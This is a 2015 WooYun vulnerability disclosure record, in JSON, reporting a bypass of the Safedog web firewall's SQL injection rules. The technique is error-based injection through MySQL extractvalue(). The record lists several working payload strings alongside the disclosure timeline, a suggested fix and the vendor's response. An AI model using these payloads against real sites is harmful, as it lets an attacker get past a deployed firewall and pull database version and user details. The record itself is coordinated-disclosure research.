{"id": 27904, "wybug_id": "wooyun-2015-0124132", "wybug_title": "Bypass网站安全狗最新防护规则（SQL报错注射技巧）之二", "wybug_corp": "安全狗", "wybug_author": "从容", "wybug_date": "2015-07-02 16:14", "wybug_open_date": "2015-08-17 17:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["过狗"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向公众公开  简要描述： 放暑假:)绕过最新网站安全狗sql注入防护规则#2 详细说明：  上一发： WooYun: Bypass网站安全狗最新防护规则（SQL报错注射技巧） 利用的是updatexml函数，然而这次用extractvalue函数进行报错注入的话也同样可以绕过:)   漏洞证明：  测试环境:windows server2003 & 最新网站安全狗(APACHE)3.1.09924 网马库更新时间2015-06-05同样随便找一个可报注入的程序~\n\n防护日志:\n\n发几个供你们测试的payload:\nextractvalue(rand(0),concat(0x0a,version()))extractvalue(floor(0),concat(0x0a,version()))extractvalue(rand(0),concat(0x0a,unhex(hex(user()))))extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))extractvalue(rand(0),convert(user() using latin1))\n   修复方案：  过滤extractvalue()函数:)   版权声明：转载请注明来源 从容@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-07-03 17:31 厂商回复： 兄弟不巧, 这些高危函数和fuzz特性我们都提交过给开发了. 就在不久前, 的那个夜晚, 那猹将身一扭，从开发的跨下逃走了...... 可惜他还没反映过来--!.感谢大家的关注, 让安全走的更远~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-24 08:39 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  兄弟不巧, 这些高危函数和fuzz特性我们都提交过给开发了. 就在不久前, 的那个夜晚, 那猹将身一扭，从开发的跨下逃走了...... 可惜他还没反映过来--!.    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}